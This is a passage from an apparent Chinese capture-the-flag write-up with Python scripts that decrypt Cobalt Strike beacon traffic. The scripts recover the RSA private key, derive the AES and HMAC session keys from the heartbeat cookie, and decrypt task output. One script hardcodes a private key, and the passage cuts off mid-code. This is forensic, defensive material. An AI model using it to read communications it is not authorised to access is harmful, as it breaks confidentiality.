</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>javaobj.v2</span> <span class=k>as</span> <span class=nn>javaobj</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_key</span><span class=p>(</span><span class=n>key_data</span><span class=p>,</span> <span class=n>key_type</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>key_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;-----BEGIN </span><span class=si>{</span><span class=n>key_type</span><span class=si>}</span><span class=s2> KEY-----</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>+=</span> <span class=n>base64</span><span class=o>.</span><span class=n>encodebytes</span><span class=p>(</span><span class=n>key_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;-----END </span><span class=si>{</span><span class=n>key_type</span><span class=si>}</span><span class=s2> KEY-----&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>formatted_key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_key</span><span class=p>(</span><span class=n>keyfile</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>keyfile</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pobj</span> <span class=o>=</span> <span class=n>javaobj</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span> <span class=o>=</span> <span class=n>format_key</span><span class=p>(</span><span class=n>pobj</span><span class=o>.</span><span class=n>array</span><span class=o>.</span><span class=n>value</span><span class=o>.</span><span class=n>privateKey</span><span class=o>.</span><span class=n>encoded</span><span class=o>.</span><span class=n>data</span><span class=p>,</span> <span class=s2>&#34;PRIVATE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>publicKey</span> <span class=o>=</span> <span class=n>format_key</span><span class=p>(</span><span class=n>pobj</span><span class=o>.</span><span class=n>array</span><span class=o>.</span><span class=n>value</span><span class=o>.</span><span class=n>publicKey</span><span class=o>.</span><span class=n>encoded</span><span class=o>.</span><span class=n>data</span><span class=p>,</span> <span class=s2>&#34;PUBLIC&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>privateKey</span><span class=p>,</span><span class=n>publicKey</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_AES_HMAC_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=p>,</span><span class=n>encode_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    提取协商密钥
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>private_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encode_data</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\xBE\xEF</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_keys</span> <span class=o>=</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_hash256</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>raw_aes_keys</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>aes_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hmac_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;AES key: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;HMAC key: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_submit_data</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span><span class=p>,</span><span class=n>encrypt_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    使用协商密钥解密CS的数据
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_l</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:</span><span class=n>encrypt_data_length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>keyfile</span> <span class=o>=</span> <span class=s2>&#34;key&#34;</span> <span class=c1># 题目一般会提供，该文件本质上为 KeyPair 的 Java 对象</span>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span><span class=p>,</span><span class=n>publicKey</span> <span class=o>=</span> <span class=n>extract_key</span><span class=p>(</span><span class=n>keyfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(privateKey)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_data</span> <span class=o>=</span> <span class=s2>&#34;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>get_AES_HMAC_key</span><span class=p>(</span><span class=n>privateKey</span><span class=p>,</span><span class=n>cookie_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>submit_data</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;000000e046950d669f91c7c7d9a7580c78f13a9f568122f2a8aba597a52f3832b0afbde054602fe158dbe173ff2532036facafdada898e3c9d798ea5e803269221fef2436fc22428e4d4aac53979ce80dd4809a2d3391dfdb1ea043e9761250175b0ceb38157319e366af76a88464f7d8672e614a051ca4fa846d6e22ee654ce0271381867f13c44ee15a26fc03316596f64bb0786e16af8a8fd900f7d0c7fa895c408e3915fa6a9a5085df6854c34dbf55d968d7f69b00b12083750c30564f94547f6eb6ee62beacda5a73d72ea7d81c79919802aecafed6d991bd0b1b18e04fca5c480&#34;</span><span class=p>,</span><span class=s2>&#34;00000040e992086d1e786eeb9b4329bf6eee6f593e44609505d7d0118af590b5e40840782232f30b12ed76f54ef4898d69470498cb4afe43841790fe12af184011858984&#34;</span><span class=p>,</span><span class=s2>&#34;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#34;</span><span class=p>,</span><span class=s2>&#34;000000e0453bf91036fff19e04ce60d065f37f4ed23345246fa7b5ce91d64de96781604717aa720a0f411cf5545d66c750ff0ee7aaa7f4be7e7070ba1ff180f6373d670c7b0e8c73617ec9e3f388a4f99a3d00aca4e85e80db6a8e1a661da37b184b2d779d2d5f6e594ca4c81b3c2fe16856b24d2d6551fed5f79540fcc4ca1ce66168d32f656ea5b7f66d26ae99812a6612da54670acc82524160fc765c1c8cc89cdf110fe4a40a195aa693bd98965abc3244f5c4bd89c104dafcd5e87542dfd90751cf8ea82a769070b01d9af4b037e1ba618de23a378d83104375cc9745893ddc5482&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>submit_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>item</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>decrypt_submit_data</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span><span class=p>,</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    </span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=给beacon的情况><span>给Beacon的情况</span>
<a href=#%e7%bb%99beacon%e7%9a%84%e6%83%85%e5%86%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>1、使用 <a href=https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py target=_blank rel="external nofollow noopener noreferrer">1768.py</a> 去解析 Beacon 文件</p><p>2、解析公钥，爆破n生成私钥</p><p>3、使用私钥去解密心跳包中的cookie信息得到<code>AES_KEY</code>和<code>HMAC_KEY</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>privateKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
</span></span></span><span class=line><span class=cl><span class=s1>FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
</span></span></span><span class=line><span class=cl><span class=s1>gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
</span></span></span><span class=line><span class=cl><span class=s1>I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
</span></span></span><span class=line><span class=cl><span class=s1>pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
</span></span></span><span class=line><span class=cl><span class=s1>qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
</span></span></span><span class=line><span class=cl><span class=s1>fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
</span></span></span><span class=line><span class=cl><span class=s1>PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
</span></span></span><span class=line><span class=cl><span class=s1>dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
</span></span></span><span class=line><span class=cl><span class=s1>Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
</span></span></span><span class=line><span class=cl><span class=s1>p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
</span></span></span><span class=line><span class=cl><span class=s1>xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
</span></span></span><span class=line><span class=cl><span class=s1>-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>publicKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
</span></span></span><span class=line><span class=cl><span class=s1>d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
</span></span></span><span class=line><span class=cl><span class=s1>-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_AES_HMAC_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=p>,</span><span class=n>encode_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提取协商密钥和主机信息</span>
</span></span><span class=line><span class=cl>    <span class=n>private_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encode_data</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\xBE\xEF</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_keys</span> <span class=o>=</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_hash256</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>raw_aes_keys</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>aes_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hmac_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span> <span class=c1># 主机信息</span>
